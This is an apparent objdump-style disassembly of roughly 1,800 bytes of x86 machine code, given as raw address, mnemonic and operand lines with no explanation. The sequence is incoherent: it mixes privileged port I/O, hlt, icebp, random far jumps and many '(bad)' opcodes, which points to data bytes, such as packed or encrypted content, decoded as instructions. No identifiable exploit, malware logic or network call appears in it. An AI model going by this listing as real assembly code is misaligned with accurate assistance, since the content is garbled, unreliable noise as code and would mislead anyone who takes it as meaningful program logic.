  41d7de:	ror    DWORD PTR [ecx+0x39],cl
  41d7e1:	loopne 0x41d834
  41d7e3:	in     al,0x9d
  41d7e5:	out    0xc9,al
  41d7e7:	aad    0x9e
  41d7e9:	and    esp,0x4e
  41d7ec:	xchg   DWORD PTR [esp+ebp*4],esi
  41d7ef:	fs mov esp,0x5cbea610
  41d7f5:	loopne 0x41d7c6
  41d7f7:	xor    eax,0x527e290e
  41d7fc:	cwde   
  41d7fd:	add    BYTE PTR [ebx+eiz*1+0x14],cl
  41d801:	loop   0x41d830
  41d803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d804:	data16 das 
  41d806:	mov    ebx,0xc1b1abc4
  41d80b:	sub    DWORD PTR [edi+0x37],edx
  41d80e:	add    eax,0xec3f3d9a
  41d813:	scas   eax,DWORD PTR es:[edi]
  41d814:	popf   
  41d815:	xchg   BYTE PTR [ecx+0x1bbc734c],bh
  41d81b:	sub    ch,bl
  41d81d:	mov    esi,0xde3de5a3
  41d822:	xor    BYTE PTR [edi-0x3],bh
  41d825:	mov    ebx,0xbcc6c1d5
  41d82a:	sahf   
  41d82b:	into   
  41d82c:	icebp  
  41d82d:	cmp    DWORD PTR [ebx],ecx
  41d82f:	and    BYTE PTR [ebx+0x481ca4],0x1e
  41d836:	xchg   ecx,eax
  41d837:	imul   esp,DWORD PTR [edx],0xbd9a65ad
  41d83d:	xchg   DWORD PTR [eax],edi
  41d83f:	scas   al,BYTE PTR es:[edi]
  41d840:	jns    0x41d82f
  41d842:	jne    0x41d87f
  41d844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d845:	xor    dl,dl
  41d847:	pop    edi
  41d848:	ja     0x41d818
  41d84a:	sbb    dl,cl
  41d84c:	mov    ecx,0x57e122b0
  41d851:	and    edi,DWORD PTR [ebx]
  41d853:	mov    al,ds:0x884ae7dc
  41d858:	xchg   ecx,eax
  41d859:	xchg   DWORD PTR [ebp-0x4ae19f8c],ebx
  41d85f:	mov    DWORD PTR [ebp+0x24c0dbd6],ebp
  41d865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d866:	jns    0x41d852
  41d868:	xchg   ebp,eax
  41d869:	mov    edi,ebp
  41d86b:	fisubr WORD PTR [edi+0x57afeb37]
  41d871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d872:	cwde   
  41d873:	les    edi,FWORD PTR [esi-0x49]
  41d876:	jmp    0x41d84a
  41d878:	xchg   BYTE PTR cs:[di-0x8],dh
  41d87d:	nop
  41d87e:	or     DWORD PTR [eax+eiz*2-0xf8f4fc8],ebp
  41d885:	in     al,dx
  41d886:	nop
  41d887:	dec    eax
  41d888:	push   cs
  41d889:	push   ebp
  41d88a:	pop    esi
  41d88b:	push   0x6a100507
  41d890:	mov    ch,0xdd
  41d892:	repz mov esi,0xd72a3656
  41d898:	test   eax,0x912e2238
  41d89d:	xchg   ecx,eax
  41d89e:	out    0x3d,eax
  41d8a0:	pop    edx
  41d8a1:	pop    ecx
  41d8a2:	ja     0x41d84a
  41d8a4:	or     al,0x92
  41d8a6:	fxch   st(2)
  41d8a8:	aam    0xac
  41d8aa:	adc    BYTE PTR [edx+ebp*2],0xf7
  41d8ae:	xor    ebp,edi
  41d8b0:	leave  
  41d8b1:	pop    ebp
  41d8b2:	push   esp
  41d8b3:	push   es
  41d8b4:	sahf   
  41d8b5:	into   
  41d8b6:	and    BYTE PTR [esp+ecx*1-0x24],dh
  41d8ba:	mov    bh,0xe8
  41d8bc:	mov    ch,0x0
  41d8be:	clc    
  41d8bf:	je     0x41d88e
  41d8c1:	mov    ebx,0x9714f0b
  41d8c6:	mov    ah,0x8b
  41d8c8:	xor    cl,BYTE PTR [esi-0x12]
  41d8cb:	mov    al,0x96
  41d8cd:	cmp    edi,DWORD PTR [ecx+0xfe0f827]
  41d8d3:	mov    es,edi
  41d8d5:	adc    esp,ecx
  41d8d7:	add    eax,0xb2d90de5
  41d8dc:	adc    ecx,ebp
  41d8de:	ret    
  41d8df:	mov    dl,0x81
  41d8e1:	outs   dx,DWORD PTR ds:[esi]
  41d8e2:	mov    ah,0x6d
  41d8e4:	adc    esi,ebx
  41d8e6:	ss mov sp,0x3fcd
  41d8eb:	ret    0x6dd0
  41d8ee:	jae    0x41d963
  41d8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8f1:	adc    al,0xcf
  41d8f3:	xchg   esp,eax
  41d8f4:	adc    ah,bl
  41d8f6:	test   eax,0x96caaceb
  41d8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8fc:	mov    esp,0x5b34e72
  41d901:	nop
  41d902:	popf   
  41d903:	call   FWORD PTR ds:0x7f488412
  41d909:	pop    ds
  41d90a:	int    0xea
  41d90c:	loop   0x41d97b
  41d90e:	ret    0x6014
  41d911:	test   eax,0xb421b22f
  41d916:	loopne 0x41d91d
  41d918:	(bad)  
  41d919:	mov    BYTE PTR [esi+0x16],bh
  41d91c:	mov    ebp,0x12470e23
  41d921:	inc    ebx
  41d922:	aaa    
  41d923:	or     BYTE PTR [ecx],0xc3
  41d926:	xor    al,0xb8
  41d928:	pushf  
  41d929:	jo     0x41d904
  41d92b:	jb     0x41d95c
  41d92d:	mov    bl,BYTE PTR [ebp+0x3787684a]
  41d933:	push   0x87cd6b69
  41d938:	loope  0x41d9a1
  41d93a:	dec    edi
  41d93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d93c:	out    0xb0,eax
  41d93e:	jae    0x41d981
  41d940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d941:	mov    dh,0xfc
  41d943:	pop    ss
  41d944:	pusha  
  41d945:	arpl   di,sp
  41d947:	fwait
  41d948:	(bad)  
  41d949:	xchg   ecx,eax
  41d94a:	mov    eax,ds:0x3b1dacb4
  41d94f:	cmp    BYTE PTR ds:0xb41d5ae1,ch
  41d955:	stc    
  41d956:	mov    al,bl
  41d958:	test   al,0xef
  41d95a:	or     al,0x62
  41d95c:	sub    eax,0x5be6c912
  41d961:	leave  
  41d962:	or     BYTE PTR [ebx+0x21932250],bl
  41d968:	imul   ebp,DWORD PTR ds:0x73b386d,0xa6aad05b
  41d972:	adc    ch,BYTE PTR [eax]
  41d974:	adc    dl,BYTE PTR [ebx+0x16]
  41d977:	sub    DWORD PTR [esi-0x29487f17],ecx
  41d97d:	pushf  
  41d97e:	lods   al,BYTE PTR ds:[esi]
  41d97f:	aaa    
  41d980:	inc    ecx
  41d981:	pop    edx
  41d982:	add    ebx,ebx
  41d984:	lock dec edx
  41d986:	xor    BYTE PTR [ebx+0x71],al
  41d989:	leave  
  41d98a:	cwde   
  41d98b:	test   al,0x2c
  41d98d:	mov    esi,0x199f09e8
  41d992:	int3   
  41d993:	jmp    0xb3c0:0x2d933f28
  41d99a:	push   ds
  41d99b:	mov    DWORD PTR [edi+0x46],esi
  41d99e:	jae    0x41d9cc
  41d9a0:	xchg   ecx,eax
  41d9a1:	outs   dx,DWORD PTR ds:[esi]
  41d9a2:	jge    0x41d99e
  41d9a4:	es ret 
  41d9a6:	sub    al,0xe8
  41d9a8:	adc    al,BYTE PTR [edi]
  41d9aa:	sahf   
  41d9ab:	ds pop ds
  41d9ad:	jle    0x41d9ce
  41d9af:	mov    esi,0x2191c228
  41d9b4:	in     eax,0x8c
  41d9b6:	leave  
  41d9b7:	int3   
  41d9b8:	mov    esp,0x3742e6e6
  41d9bd:	retf   
  41d9be:	ror    DWORD PTR [ecx+0x555baf67],cl
  41d9c4:	sub    esp,0x3d
  41d9c7:	repnz mov bl,0xc8
  41d9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9cb:	or     al,0xdf
  41d9cd:	leave  
  41d9ce:	xchg   edx,eax
  41d9cf:	aam    0xb8
  41d9d1:	adc    bh,al
  41d9d3:	sbb    DWORD PTR [edi],eax
  41d9d5:	out    0x40,eax
  41d9d7:	sti    
  41d9d8:	pop    ds
  41d9d9:	(bad)  
  41d9db:	mov    esp,0x72d32f2e
  41d9e0:	stc    
  41d9e1:	lock imul edi,DWORD PTR [edi+ebp*4-0x29c9c17b],0x5f
  41d9ea:	outs   dx,DWORD PTR ds:[esi]
  41d9eb:	mov    al,0x4a
  41d9ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9ee:	retf   
  41d9ef:	addr16 xchg ecx,eax
  41d9f1:	call   FWORD PTR [eax-0x50]
  41d9f4:	xchg   ebx,eax
  41d9f5:	mov    ds,WORD PTR [ebp-0x14]
  41d9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9f9:	das    
  41d9fa:	push   edx
  41d9fb:	xchg   ebp,eax
  41d9fc:	in     eax,dx
  41d9fd:	fmul   DWORD PTR [edx]
  41d9ff:	lock pusha 
  41da01:	dec    esp
  41da02:	cdq    
  41da03:	sbb    DWORD PTR [ebx+0x792259fa],esp
  41da09:	cmp    al,0x42
  41da0b:	jle    0x41da2f
  41da0d:	dec    edx
  41da0e:	push   0xc3bb5d0e
  41da13:	pop    edi
  41da14:	lods   eax,DWORD PTR ds:[esi]
  41da15:	mov    bh,0x6f
  41da17:	pop    ebx
  41da18:	aam    0x89
  41da1a:	shl    BYTE PTR ss:[edi+0x38ba4893],0x37
  41da22:	scas   eax,DWORD PTR es:[edi]
  41da23:	mov    bh,0x57
  41da25:	jge    0x41d9b7
  41da27:	retf   
  41da28:	pop    ecx
  41da2a:	std    
  41da2b:	repnz rcl bh,1
  41da2e:	call   0xb9adbcd6
  41da33:	dec    eax
  41da34:	sub    esp,edx
  41da36:	popa   
  41da37:	and    eax,0x3a6e81f9
  41da3c:	or     eax,0x2b0e9d0f
  41da41:	je     0x41d9d0
  41da43:	sub    esi,DWORD PTR [eax]
  41da45:	out    0x87,al
  41da47:	icebp  
  41da48:	mov    esp,DWORD PTR [ecx-0x5d]
  41da4b:	out    0xad,al
  41da4d:	mov    ch,0xa
  41da4f:	pushf  
  41da50:	push   eax
  41da51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da52:	adc    esi,ecx
  41da54:	clc    
  41da55:	add    ah,BYTE PTR [edx]
  41da57:	cmp    al,0xea
  41da59:	fldenv ds:0xe43a6913
  41da5f:	retf   0x3b1c
  41da62:	adc    dl,BYTE PTR [ebp-0x38]
  41da65:	je     0x41dacb
  41da67:	mov    ah,0x33
  41da69:	(bad)  
  41da6a:	pop    ecx
  41da6b:	cmp    DWORD PTR [ebp+0x29231732],0xffffffd3
  41da72:	and    BYTE PTR [ebx+0x59180597],dl
  41da78:	or     DWORD PTR [edx],0xffffff8d
  41da7b:	pop    edi
  41da7c:	fdivr  DWORD PTR [eax]
  41da7e:	out    dx,eax
  41da7f:	ret    
  41da80:	aaa    
  41da81:	jl     0x41dacd
  41da83:	xor    BYTE PTR [bx+di],dh
  41da86:	xchg   ebx,eax
  41da87:	test   eax,0xdfa6fcb
  41da8c:	shr    DWORD PTR [eax+0x12],0xa5
  41da90:	ficomp DWORD PTR [edi+0x12edd68d]
  41da96:	fucomi st,st(7)
  41da98:	(bad)  
  41da99:	mov    edx,0xad2f9fd0
  41da9e:	rcl    DWORD PTR [ebx-0x40f9a31e],0xa7
  41daa5:	xchg   edi,eax
  41daa6:	(bad)  
  41daa7:	loop   0x41dafa
  41daa9:	cmc    
  41daaa:	aaa    
  41daab:	mov    ecx,0x94abdd56
  41dab0:	cld    
  41dab1:	jbe    0x41daa4
  41dab3:	neg    DWORD PTR [ecx]
  41dab5:	push   edi
  41dab6:	fsubrp st(1),st
  41dab8:	hlt    
  41dab9:	pop    esp
  41daba:	or     al,BYTE PTR [edi-0x50ac64e1]
  41dac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dac1:	xor    DWORD PTR ds:0xe2d88bf1,edx
  41dac7:	hlt    
  41dac8:	push   0x2a
  41daca:	ret    0x54f3
  41dacd:	push   ecx
  41dace:	jl     0x41da93
  41dad0:	push   esp
  41dad1:	add    al,0xdc
  41dad3:	imul   ecx,DWORD PTR [edi+0x377ad4a3],0xf61579d8
  41dadd:	dec    edx
  41dade:	push   ebx
  41dadf:	dec    ebp
  41dae0:	jnp    0x41db34
  41dae2:	out    0x72,al
  41dae4:	adc    esp,DWORD PTR [edi]
  41dae6:	or     BYTE PTR [ebx],ah
  41dae8:	ja     0x41da77
  41daea:	stc    
  41daeb:	push   ds
  41daec:	test   dh,cl
  41daee:	dec    esp
  41daef:	(bad)  
  41daf0:	mov    ecx,0x60e2f545
  41daf5:	add    edx,esp
  41daf7:	jp     0x41daa3
  41daf9:	test   DWORD PTR [ecx+0x50],ecx
  41dafc:	inc    ebp
  41dafd:	ds dec edi
  41daff:	xor    DWORD PTR [edi],edx
  41db01:	jl     0x41dae9
  41db03:	pop    es
  41db04:	xlat   BYTE PTR ds:[ebx]
  41db05:	dec    edx
  41db06:	add    BYTE PTR [ebp+0x2b],al
  41db09:	(bad)  
  41db0b:	popa   
  41db0c:	outs   dx,DWORD PTR ds:[esi]
  41db0d:	test   al,0x8
  41db0f:	stos   BYTE PTR es:[edi],al
  41db10:	out    dx,al
  41db11:	ja     0x41dab9
  41db13:	in     eax,dx
  41db14:	add    eax,0x4c0534a
  41db19:	and    BYTE PTR [edx+edi*4+0x2c6bb3e2],bl
  41db20:	es jmp 0xf7c321a0
  41db26:	mov    dh,0x67
  41db28:	jl     0x41db99
  41db2a:	in     eax,dx
  41db2b:	xchg   edi,eax
  41db2c:	hlt    
  41db2d:	mov    ebx,DWORD PTR [edx+eiz*1-0x4e]
  41db31:	push   cs
  41db32:	sub    al,0xd7
  41db34:	push   ss
  41db35:	sbb    dh,BYTE PTR [ecx+ecx*1-0x5]
  41db39:	jle    0x41db8c
  41db3b:	sbb    al,0x69
  41db3d:	sbb    edi,esp
  41db3f:	jae    0x41db4c
  41db41:	push   es
  41db42:	cmp    cl,dl
  41db44:	in     al,0xf
  41db46:	adc    dh,ah
  41db48:	arpl   WORD PTR [edx],bx
  41db4a:	add    DWORD PTR [ecx+ecx*2],0xb14311f8
  41db51:	and    al,0x46
  41db53:	je     0x41db70
  41db55:	cwde   
  41db56:	push   ss
  41db57:	cdq    
  41db58:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41db5a:	mov    bl,0x66
  41db5c:	adc    dl,BYTE PTR [esi]
  41db5e:	frstor [edx+0x17]
  41db61:	xchg   cl,bl
  41db63:	xchg   ebp,eax
  41db64:	xchg   esp,eax
  41db65:	xchg   DWORD PTR [esi],esi
  41db67:	ins    BYTE PTR es:[edi],dx
  41db68:	adc    BYTE PTR [ebx+0x6500824f],ah
  41db6e:	fdivr  st,st(4)
  41db70:	fsub   DWORD PTR [eax+0x2]
  41db73:	mov    WORD PTR [ebx+0x3e1f9971],?
  41db79:	ss call 0xb02:0x916a51b0
  41db81:	lea    edx,[edi+0x7c]
  41db84:	aas    
  41db85:	push   es
  41db86:	mov    eax,0x6ef92392
  41db8b:	data16 in al,dx
  41db8d:	pop    edi
  41db8e:	mov    esp,0x7ccec50
  41db93:	mov    cl,0x6b
  41db95:	dec    ecx
  41db96:	xor    ecx,0xfab7b6ff
  41db9c:	pop    ebp
  41db9d:	mov    bh,0xe9
  41db9f:	test   ebx,0x2e5924d0
  41dba5:	or     al,0x68
  41dba7:	and    DWORD PTR [ebx+0x467c9305],esp
  41dbad:	xor    esp,ebp
  41dbaf:	sbb    al,0x62
  41dbb1:	mov    eax,ds:0x8cc6c59a
  41dbb6:	mov    DWORD PTR [edi+0x16a2705],ecx
  41dbbc:	xchg   ebp,eax
  41dbbd:	es and eax,0xcfdc6f24
  41dbc3:	jne    0x41dbdf
  41dbc5:	loop   0x41dc3d
  41dbc7:	shl    DWORD PTR [edx],0x62
  41dbca:	add    BYTE PTR [esi],al
  41dbcc:	mov    al,0x5
  41dbce:	fstp   QWORD PTR [edi]
  41dbd0:	scas   al,BYTE PTR es:[edi]
  41dbd1:	outs   dx,BYTE PTR ds:[esi]
  41dbd2:	aad    0xa3
  41dbd4:	je     0x41dc4f
  41dbd6:	fst    DWORD PTR [eax+0x21]
  41dbd9:	mov    bh,0x37
  41dbdb:	aaa    
  41dbdc:	fiadd  WORD PTR [edx]
  41dbde:	sub    DWORD PTR [ebx],ebp
  41dbe0:	rcr    dl,cl
  41dbe2:	xor    DWORD PTR ds:0x1b84116a,edx
  41dbe8:	mov    eax,0xf67c410
  41dbed:	or     cl,ch
  41dbef:	call   FWORD PTR [edi-0x67]
  41dbf2:	ja     0x41dbd2
  41dbf4:	sbb    dl,dl
  41dbf6:	dec    edi
  41dbf7:	adc    ah,ah
  41dbf9:	adc    edi,DWORD PTR [ecx+edi*4+0x5]
  41dbfd:	push   es
  41dbfe:	aaa    
  41dbff:	das    
  41dc00:	mov    ds:0x50f5bf75,al
  41dc05:	lods   al,BYTE PTR ds:[esi]
  41dc06:	test   eax,0x5e3bbba4
  41dc0b:	jl     0x41dc15
  41dc0d:	xchg   ecx,eax
  41dc0e:	jbe    0x41dc56
  41dc10:	pop    esi
  41dc11:	mov    edi,0x8650bb56
  41dc16:	jns    0x41dbc5
  41dc18:	shr    DWORD PTR [ebx+0x78],1
  41dc1b:	loopne 0x41dc8a
  41dc1d:	cwde   
  41dc1e:	unpcklps xmm0,XMMWORD PTR [esi+0x78]
  41dc22:	and    DWORD PTR [edx],edx
  41dc24:	loop   0x41dc39
  41dc26:	inc    edx
  41dc27:	sbb    edi,ecx
  41dc29:	ins    BYTE PTR es:[edi],dx
  41dc2a:	and    dh,BYTE PTR [edi+0x34]
  41dc2d:	test   al,0xe0
  41dc2f:	xchg   ebp,eax
  41dc30:	and    ebx,DWORD PTR [esi-0xd85d1a2]
  41dc36:	outs   dx,DWORD PTR ds:[esi]
  41dc37:	dec    ecx
  41dc38:	pop    ds
  41dc39:	inc    ecx
  41dc3a:	std    
  41dc3b:	sbb    BYTE PTR [ebp+0xe8f3e1e],bh
  41dc41:	ror    BYTE PTR [esi],0xe7
  41dc44:	sar    DWORD PTR [edx+edx*2+0x18],1
  41dc48:	pop    ebx
  41dc49:	popf   
  41dc4a:	js     0x41dc37
  41dc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc4d:	pushf  
  41dc4e:	add    eax,0x14a53fca
  41dc53:	xchg   ebx,eax
  41dc54:	jecxz  0x41dcb0
  41dc56:	adc    BYTE PTR [esi-0xd],dh
  41dc59:	xchg   ebx,eax
  41dc5a:	les    esi,FWORD PTR [esi+0x6d]
  41dc5d:	stos   DWORD PTR es:[edi],eax
  41dc5e:	out    0x18,eax
  41dc60:	xor    edi,0x265eb383
  41dc66:	add    DWORD PTR [eax-0x481a4f4c],esp
  41dc6c:	cmp    dh,BYTE PTR [edx+ebx*4-0x8706412]
  41dc73:	cmp    eax,0x2ed89eb2
  41dc78:	sti    
  41dc79:	popf   
  41dc7a:	mov    ch,0x54
  41dc7c:	sub    DWORD PTR [ebx+0x71],ebx
  41dc7f:	cmp    cl,dl
  41dc81:	lds    ebx,FWORD PTR [ecx]
  41dc83:	fstp   TBYTE PTR [eax+0x6fd49d21]
  41dc89:	xchg   edx,eax
  41dc8a:	aas    
  41dc8b:	out    0xff,al
  41dc8d:	cdq    
  41dc8e:	jle    0x41dc9c
  41dc90:	into   
  41dc91:	or     al,0x9f
  41dc93:	(bad)  
  41dc95:	and    BYTE PTR [ebp-0x5],0xcb
  41dc99:	(bad)  
  41dc9a:	(bad)  
  41dc9b:	push   ebx
  41dc9c:	sbb    dh,BYTE PTR [esi]
  41dc9e:	fild   WORD PTR [esi-0x57]
  41dca1:	aam    0xa1
  41dca3:	pop    es
  41dca4:	dec    ecx
  41dca5:	mov    dl,0x51
  41dca7:	mov    dh,BYTE PTR [ecx+0x62f0fc0b]
  41dcad:	add    bl,BYTE PTR [esi-0x3c6371ef]
  41dcb3:	scas   al,BYTE PTR es:[edi]
  41dcb4:	jl     0x41dcb8
  41dcb6:	in     al,dx
  41dcb7:	push   eax
  41dcb8:	xchg   DWORD PTR [edx],ebp
  41dcba:	adc    al,0x11
  41dcbc:	mov    ds:0x41964edf,eax
  41dcc1:	inc    edi
  41dcc2:	sub    BYTE PTR [esi-0x5ea67eec],dh
  41dcc8:	popf   
  41dcc9:	xor    edx,DWORD PTR [eax+0x1462a1f6]
  41dccf:	into   
  41dcd0:	rol    DWORD PTR [ebp-0xd36c236],1
  41dcd6:	stos   DWORD PTR es:[edi],eax
  41dcd7:	xor    eax,edx
  41dcd9:	sub    ch,bh
  41dcdb:	push   edi
  41dcdc:	and    BYTE PTR [eax],0x71
  41dcdf:	sti    
  41dce0:	(bad)  
  41dce1:	mov    cl,0xe9
  41dce3:	aaa    
  41dce4:	js     0x41dd11
  41dce6:	into   
  41dce7:	jp     0x41dd5f
  41dce9:	add    al,dh
  41dceb:	aas    
  41dcec:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41dcee:	push   0xffffffa0
  41dcf0:	jns    0x41dcd8
  41dcf2:	mov    ecx,0x77fe5a69
  41dcf7:	xor    bl,cl
  41dcf9:	inc    eax
  41dcfa:	leave  
  41dcfb:	inc    esi
  41dcfc:	in     eax,0x1b
  41dcfe:	add    al,0x9e
  41dd00:	fwait
  41dd01:	add    al,0xbd
  41dd03:	ins    DWORD PTR es:[edi],dx
  41dd04:	outs   dx,DWORD PTR ds:[esi]
  41dd05:	mov    esp,DWORD PTR [ebx+0x3041316c]
  41dd0b:	add    BYTE PTR [edx-0x16],0x2e
  41dd0f:	mov    cs,WORD PTR [eax]
  41dd11:	sub    edx,DWORD PTR [ebx]
  41dd13:	addr16 push ebp
  41dd15:	cmp    al,0x95
  41dd17:	adc    eax,0x1a59aed4
  41dd1c:	loop   0x41dd16
  41dd1e:	call   DWORD PTR [ebx-0x2d]
  41dd21:	and    ecx,DWORD PTR [edx-0x4a]
  41dd24:	retf   0x2b13
  41dd27:	jbe    0x41dcaf
  41dd29:	clc    
  41dd2a:	dec    edx
  41dd2b:	sub    BYTE PTR [esi],0x2a
  41dd2e:	adc    BYTE PTR [ecx-0x36],cl
  41dd31:	push   eax
  41dd32:	cs leave 
  41dd34:	jmp    0x8c4d:0x1186e675
  41dd3b:	inc    esi
  41dd3c:	adc    eax,0xfe918648
  41dd41:	push   ds
  41dd42:	xchg   ebx,eax
  41dd43:	sub    eax,0xb18c477
  41dd48:	xor    dl,BYTE PTR [edi+0x4c95dab7]
  41dd4e:	add    ebx,ebx
  41dd50:	mov    ds:0x13ea074e,al
  41dd55:	fmul   DWORD PTR [ebp-0x63e48b42]
  41dd5b:	mov    edi,0x74ef604a
  41dd60:	shl    ch,1
  41dd62:	jge    0x41dd85
  41dd64:	inc    esp
  41dd65:	cli    
  41dd66:	mov    eax,ds:0xdc9eb792
  41dd6b:	outs   dx,BYTE PTR ds:[esi]
  41dd6c:	fistp  QWORD PTR [ecx]
  41dd6e:	push   ebp
  41dd6f:	fs out dx,al
  41dd71:	mov    cl,0x2d
  41dd73:	fistp  WORD PTR [esp+edx*2+0x45]
  41dd77:	adc    eax,DWORD PTR [eax+edi*4]
  41dd7a:	in     eax,0x9d
  41dd7c:	fwait
  41dd7d:	cmp    edx,ebx
  41dd7f:	out    0x6e,al
  41dd81:	and    BYTE PTR [eax+edx*8-0xb],0xc2
  41dd86:	or     BYTE PTR [edi-0xb],0x9a
  41dd8a:	out    dx,al
  41dd8b:	adc    DWORD PTR [ebx],eax
  41dd8d:	pop    ebx
  41dd8e:	xor    edx,DWORD PTR ds:0x973de897
  41dd94:	scas   al,BYTE PTR es:[edi]
  41dd95:	inc    edi
  41dd96:	dec    esp
  41dd97:	dec    eax
  41dd98:	xor    al,0x59
  41dd9a:	jmp    0x41dd64
  41dd9c:	adc    al,0x37
  41dd9e:	in     al,0x91
  41dda0:	mov    edx,0x413d6183
  41dda5:	mov    al,0x7
  41dda7:	cmp    al,0xb2
  41dda9:	xor    BYTE PTR [edi+0x42],0x6e
  41ddad:	pop    esi
  41ddae:	repnz (bad) 
  41ddb0:	sub    al,0x95
  41ddb2:	pop    ebp
  41ddb3:	or     BYTE PTR [ecx-0x32267243],dl
  41ddb9:	xor    ebx,ebx
  41ddbb:	or     bh,BYTE PTR [edx-0x19c18098]
  41ddc1:	mov    cl,0xcd
  41ddc3:	fwait
  41ddc4:	outs   dx,DWORD PTR ds:[esi]
  41ddc5:	in     eax,dx
  41ddc6:	out    0xb6,al
  41ddc8:	mov    BYTE PTR [edi-0x5c399c4a],dl
  41ddce:	xchg   ecx,eax
  41ddcf:	dec    edx
  41ddd0:	stos   DWORD PTR es:[edi],eax
  41ddd1:	mov    ch,0xfc
  41ddd3:	push   es
  41ddd4:	out    0xfe,al
  41ddd6:	pusha  
  41ddd7:	leave  
  41ddd8:	out    dx,eax
  41ddd9:	or     DWORD PTR [esp+esi*1-0x64709329],eax
  41dde0:	test   DWORD PTR [ebp-0x3ccf3734],edx
  41dde6:	cmp    al,0xc5
  41dde8:	push   edx
  41dde9:	mov    eax,ds:0xc604da78
  41ddee:	cmp    esi,ebp
  41ddf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddf1:	or     ah,bh
  41ddf3:	nop
  41ddf4:	es xchg ebx,eax
  41ddf6:	popf   
  41ddf7:	bound  edi,QWORD PTR [ecx]
  41ddf9:	cmp    dl,BYTE PTR [eax-0x46]
  41ddfc:	ror    DWORD PTR [ebx-0x5f95a683],0x7a
  41de03:	jno    0x41de35
  41de05:	xchg   ecx,eax
  41de06:	loop   0x41de27
  41de08:	pop    eax
  41de09:	cld    
  41de0a:	sub    DWORD PTR [edi+0x50],edi
  41de0d:	int    0x8f
  41de0f:	mov    al,0x80
  41de11:	add    cl,BYTE PTR [ebx+ecx*1-0x3f]
  41de15:	inc    ebp
  41de16:	cmp    DWORD PTR [ebp+0x10c4ca27],esi
  41de1c:	(bad)  
  41de1d:	jge    0x41ddc7
  41de1f:	push   edx
  41de20:	aad    0x37
  41de22:	cdq    
  41de23:	adc    DWORD PTR [eax-0x6d],ecx
  41de26:	ret    
  41de27:	int3   
  41de28:	pushf  
  41de29:	inc    ebp
  41de2a:	jbe    0x41de13
  41de2c:	mov    ebx,DWORD PTR [edi]
  41de2e:	push   0x3c
  41de30:	ds xor al,0x20
  41de33:	rcr    DWORD PTR [ebp-0x29590ed1],1
  41de39:	shl    DWORD PTR [esi-0x6d3bfadf],0x54
  41de40:	nop
  41de41:	adc    esp,eax
  41de43:	add    ebx,DWORD PTR [ebx+0x704383d8]
  41de49:	loope  0x41de15
  41de4b:	pop    ebx
  41de4c:	adc    ebp,DWORD PTR [ecx+0x6f]
  41de4f:	std    
  41de50:	test   ebp,0x493703ce
  41de56:	ins    BYTE PTR es:[edi],dx
  41de57:	stos   DWORD PTR es:[edi],eax
  41de58:	sub    eax,0xc22a355a
  41de5d:	outs   dx,BYTE PTR ds:[esi]
  41de5e:	jmp    FWORD PTR [ecx-0x2ec6c78a]
  41de64:	sub    ebp,DWORD PTR [edi-0x2e]
  41de67:	cmp    dl,BYTE PTR ds:0x4521fc09
  41de6d:	jo     0x41de0a
  41de6f:	and    eax,0xf542f812
  41de74:	xor    DWORD PTR [ecx-0x430b46b2],0xffffffc7
  41de7b:	jbe    0x41def3
  41de7d:	xchg   edx,eax
  41de7e:	(bad)  
  41de7f:	cmp    dl,BYTE PTR [edx-0xb66df22]
  41de85:	ins    BYTE PTR es:[edi],dx
  41de86:	in     al,dx
  41de87:	sbb    DWORD PTR [edx+0x53],eax
  41de8a:	stos   BYTE PTR es:[edi],al
  41de8b:	jle    0x41df07
  41de8d:	adc    ebx,esi
  41de8f:	mov    cl,0x17
  41de91:	repz push es
  41de93:	out    0x99,al
  41de95:	(bad)  
  41de96:	ins    BYTE PTR es:[edi],dx
  41de97:	xchg   esp,eax
  41de98:	or     al,BYTE PTR [edx+eax*2+0x23]
  41de9c:	jae    0x41de9a
  41de9e:	mov    ds:0xbc8be342,eax
  41dea3:	jb     0x41de2a
  41dea5:	call   0x8853:0x776bfdee
  41deac:	and    DWORD PTR [edx-0x37],esi
  41deaf:	lahf   
  41deb0:	les    ebp,FWORD PTR [eax]
  41deb2:	cdq    
  41deb3:	lods   al,BYTE PTR fs:[esi]
  41deb5:	pushf  
  41deb6:	retw   0x95bc
  41deba:	into   
  41debb:	out    0xc4,al
  41debd:	fiadd  DWORD PTR [ecx+0x55]
  41dec0:	out    dx,eax
  41dec1:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dec3:	adc    al,0x8c
  41dec5:	mov    cl,0x2d
  41dec7:	xor    al,0x78
  41dec9:	xchg   ebp,eax
  41deca:	xor    eax,0x9fad35d4
  41decf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded0:	int3   
  41ded1:	int    0x9e
  41ded3:	aad    0x89
  41ded5:	mov    ds:0xc7b5b2,eax
  41deda:	xchg   dl,cl
  41dedc:	jmp    0x269a:0xe0356ac9
  41dee3:	mov    al,0xf2
  41dee5:	push   es
  41dee6:	rcr    DWORD PTR [edx+edx*4],cl
  41dee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deea:	ss inc edx
  41deec:	call   0xfd09ce5a
  41def1:	lahf   
  41def2:	data16 sbb al,bh
  41def5:	stc    
  41def6:	adc    eax,0x53d71a90
  41defb:	xchg   ebp,eax
  41defc:	mov    ch,BYTE PTR [ebp-0x382ac85e]
  41df02:	rcl    BYTE PTR fs:[ebx+eax*1+0x9],1
  41df07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df08:	mov    dh,0x80
  41df0a:	ins    BYTE PTR es:[edi],dx
